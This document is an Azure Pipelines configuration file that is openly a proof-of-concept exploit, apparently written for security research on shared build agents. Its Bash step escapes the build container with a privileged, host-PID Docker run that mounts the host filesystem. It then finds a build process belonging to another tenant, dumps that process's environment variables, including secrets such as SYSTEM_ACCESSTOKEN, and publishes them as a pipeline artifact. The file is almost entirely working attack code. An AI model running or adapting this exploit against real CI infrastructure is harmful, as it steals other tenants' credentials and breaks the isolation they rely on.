# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Cross-Tenant Process Snooping'
  jobs:
  - job: Host_Escape_And_Process_Snooping
    displayName: 'PoC: Steal Secrets from Other Tenant Processes'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Inspect Host Processes'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          echo "--- ESCAPING CONTAINER to inspect all processes on the host ---"
          
          # This command will escape to the host and run a script to analyze processes.
          # We are looking for any process NOT owned by root or our own user (vsts).
          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              echo '--- [HOST] Listing all running processes with user info and command... ---'
              # Use -eo to specify exact output columns for easy parsing.
              chroot /hostfs /bin/ps -eo pid,user,cmd > /artifacts/full-process-list.txt

              echo '--- [HOST] Searching for a potential victim process from another tenant... ---'
              # Find the PID of a process that is not ours and not root/system.
              # We look for common build commands. This is our best bet to find another job.
              VICTIM_PID=\$(cat /artifacts/full-process-list.txt | grep -E 'npm|mvn|dotnet|python|sh -c' | grep -v 'vsts' | grep -v 'root' | awk '{print \$1}' | head -n 1)

              if [ -z \"\$VICTIM_PID\" ]; then
                echo '⚠️ No obvious victim process found in this run. The host may not be shared at this exact moment.'
                echo 'Check full-process-list.txt to manually verify.'
              else
                echo \"✅ POTENTIAL VICTIM FOUND! Process ID: \$VICTIM_PID\"
                
                echo '--- [HOST] Dumping environment variables from victim process \$VICTIM_PID ---'
                # The 'environ' file is null-delimited, so we use 'tr' to make it readable.
                chroot /hostfs /bin/cat /proc/\$VICTIM_PID/environ | tr '\\0' '\\n' > /artifacts/victim-environment-variables.txt
                
                echo \"✅✅✅ SMOKING GUN: Successfully dumped environment variables from another process.\"
                echo \"Check 'victim-environment-variables.txt' for secrets like SYSTEM_ACCESSTOKEN.\"
              fi
            "
          
          echo "--- SCRIPT COMPLETE. Final artifacts are being published. ---"
          echo "Full process list:"
          cat artifacts/full-process-list.txt | head -n 30
          
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Process Snooping Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-poc-process-snooping'
